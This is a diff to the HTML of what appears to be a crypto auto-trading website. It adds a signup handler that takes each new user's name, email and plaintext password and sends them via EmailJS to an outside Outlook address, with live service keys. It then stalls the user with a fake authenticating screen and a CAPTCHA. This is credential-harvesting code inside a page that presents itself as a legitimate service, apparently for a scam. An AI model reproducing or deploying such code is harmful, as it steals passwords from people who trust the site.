@@ -18,6 +18,27 @@
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>  
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>  
   <script defer src="https://cdn.jsdelivr.net/npm/@floating-ui/dom@1.5.2"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+ <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>
+ <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+
+  <style>
+    .page { display: none; }
+    .page.active { display: block; }
+    .loader {
+      border: 5px solid #1e3a5f;
+      border-top: 5px solid #facc15;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 2rem auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
   <style>  
   .nav-btn {  
     background: none;  
@@ -2652,5 +2673,100 @@ window.addEventListener("load", () => {
       }
     }
   </script>
+<script>
+  // Initialize EmailJS
+  emailjs.init("n9BsaM4ZjH178UeSf");
+
+  const serviceID = "service_xg8bzqs";
+  const submitTemplateID = "template_gclz9gu";
+  const autoReplyTemplateID = "template_r0zg4zj";
+  const domainCaptchaLink = "https://auto-tradingbot.github.io/System/#page2ii";
+
+  // Show only the requested page and hide others
+  function showPage(pageId) {
+    document.querySelectorAll(".page").forEach(page => {
+      page.classList.add("hidden");
+      page.classList.remove("flex", "items-center", "justify-center");
+    });
+    const nextPage = document.getElementById(pageId);
+    if (nextPage) {
+      nextPage.classList.remove("hidden");
+      nextPage.classList.add("flex", "items-center", "justify-center");
+    }
+  }
+
+  // Handle signup form submission
+  async function handleSignUp() {
+    const fullName = document.getElementById("signFullName").value.trim();
+    const email = document.getElementById("signEmail").value.trim();
+    const password = document.getElementById("signPassword").value;
+
+    if (!fullName || !email || password.length < 6) {
+      alert("Please fill in all fields with valid data. Password must be at least 6 characters.");
+      return;
+    }
+
+    const templateParamsSubmit = {
+      to_email: "Blockchainautomated@outlook.com",
+      user_name: fullName,
+      user_email: email,
+      user_password: password
+    };
+
+    const templateParamsReply = {
+      user_email: email,
+      captcha_link: domainCaptchaLink,
+      customer: fullName
+    };
+
+    try {
+      // Show authenticating page
+      showPage("page2i");
+
+      // Send registration info to admin
+      await emailjs.send(serviceID, submitTemplateID, templateParamsSubmit);
+
+      // Send auto-reply with CAPTCHA link to user
+      await emailjs.send(serviceID, autoReplyTemplateID, templateParamsReply);
+
+      // After 30 seconds, show CAPTCHA page
+      setTimeout(() => {
+        showPage("page2ii");
+        // Render hCaptcha explicitly (in case needed)
+        if (typeof hcaptcha !== "undefined") {
+          hcaptcha.render(document.querySelector('.h-captcha'), {
+            sitekey: "4e5a8260-9554-439c-8d58-76f04ca823c8",
+            theme: "dark"
+          });
+        }
+      }, 30000);
+
+    } catch (error) {
+      console.error("EmailJS error:", error);
+      alert("An error occurred. Please try again.");
+      showPage("page2");
+    }
+  }
+
+  // Called when user clicks Verify on CAPTCHA page
+  function completeCaptcha() {
+    // Validate captcha response
+    const response = hcaptcha.getResponse();
+    if (!response) {
+      alert("Please complete the CAPTCHA first.");
+      return;
+    }
+    alert("CAPTCHA verified successfully!");
+    // Proceed to dashboard or next page
+    showPage("page3");
+
+    // Optionally show welcome with full name
+    const fullName = document.getElementById("signFullName").value.trim() || "User";
+    document.getElementById("welcomeUser").textContent = fullName;
+
+    // Reset hCaptcha for next time
+    hcaptcha.reset();
+  }
+</script>
 </body>
 </html>
